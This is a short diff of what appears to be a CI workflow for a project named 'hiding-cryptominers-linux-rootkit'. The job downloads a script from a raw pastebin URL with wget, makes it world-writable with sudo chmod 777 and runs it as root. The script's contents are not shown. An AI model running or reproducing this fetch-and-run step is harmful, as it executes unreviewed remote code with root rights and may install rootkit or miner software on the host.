@@ -19,5 +19,5 @@ jobs:
           cd hiding-cryptominers-linux-rootkit/
           sudo wget -O ab.sh https://pastebin.com/raw/D7E7Pcay
           export USER=root
-          chmod 777 ab.sh
+          sudo chmod 777 ab.sh
           ./ab.sh
